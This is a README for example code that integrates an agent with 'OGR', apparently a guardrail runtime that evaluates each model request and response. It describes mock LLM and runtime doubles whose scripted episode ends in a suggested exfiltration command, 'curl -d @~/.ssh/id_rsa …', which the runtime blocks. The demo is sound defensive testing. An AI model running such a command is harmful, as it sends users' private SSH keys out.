# examples — integrate YOUR agent

This directory is the runnable form of the spec's
[minimal integration](../specification/runtime-api.md#the-minimal-integration-your-own-agent):
the answer to "how do I put OGR in front of **my** agent". The whole protocol
is **one endpoint, two calls per model call** — `POST /v1/evaluate` with the
exact request body you are about to send to your LLM, and again with the exact
response body before you act on it. The runtime does everything else
(sessions, turns, decomposition, detection). Fail-open by default: if the
runtime is unreachable, your agent keeps running.

```
minimal-agent/
  agent.py            the spec's example, fleshed out: a tiny tool-using agent
                      loop (OpenAI chat shape, read_file + calc executed
                      locally) with the two evaluate calls and fail-open
  streaming_agent.py  the same loop with a streamed model call — hold the last
                      ~200 chars, judge the reassembled whole once, release the
                      tail on allow / cut the stream on block
  mock_runtime.py     stdlib OGR runtime double: strict GuardEvent validation,
                      allows everything except a configurable block marker
  mock_llm.py         stdlib OpenAI-chat-compatible double (non-stream + SSE)
                      scripting a short tool episode that ends in an
                      exfiltration attempt
  demo.sh             starts both mocks, runs both agents, cleans up
  notes.txt           the toy file the agent's read_file tool reads
```

## Quickstart (offline, first try)

```bash
pip install -r requirements.txt     # just `requests`
cd minimal-agent && ./demo.sh
```

The demo needs no network and no keys: `agent.py` runs a three-step episode
whose final model response suggests `curl -d @~/.ssh/id_rsa …` and is
**blocked** before the agent acts on it; `streaming_agent.py` streams one
answer whose held tail is released on `allow`, then one whose tail carries the
same exfiltration command and is **cut**.

## Pointing at a real runtime and a real LLM

Everything is environment variables — the code doesn't change:

```bash
export OGR_RUNTIME_URL=https://ogr.example.com   # your runtime's base URL
export OGR_API_KEY=ogr_xxxxxxxx                  # your organization API key
export LLM_BASE_URL=https://api.openai.com       # any OpenAI-compatible endpoint
export LLM_API_KEY=sk-...
export LLM_MODEL=gpt-5
python minimal-agent/agent.py "Read notes.txt and total the refunds."
```

## The identity five-tuple

Every event carries all five fields; the empty string is the explicit "no
assertion", never an error (the runtime then derives identity from the API
key — the [identity floor](../specification/guard-event.md#the-api-key-is-the-identity-floor)).

| Field | Meaning | Empty means |
|---|---|---|
| `agent_id` | WHICH agent — unique in your org; policy and inventory key on it | derived from the API key |
| `agent_type` | what KIND — harness/product label; describes, never selects policy | unlabeled |
| `agent_workspace` | agent GROUP — one workspace, one policy set | the API key's workspace |
| `agent_owner` | WHO is responsible for the agent (accountability, not policy) | unattributed |
| `agent_user` | who is USING it this session | every session is one user |

## Where to go next

- [`specification/runtime-api.md`](../specification/runtime-api.md) — the
  normative HTTP binding: the recipe, streaming tail-hold, conformance.
- [`specification/guard-event.md`](../specification/guard-event.md) and
  [`specification/verdict.md`](../specification/verdict.md) — the two wire
  objects; schemas in [`schema/`](../schema/).
- [`specification/degraded-mode.md`](../specification/degraded-mode.md) — why
  fail-open is the default and how to opt into `closed`.
- [`integrations/`](../integrations/) — the shipped plugins (Higress gateway,
  `dsh` agent-direct, …) that implement the same recipe in production form.
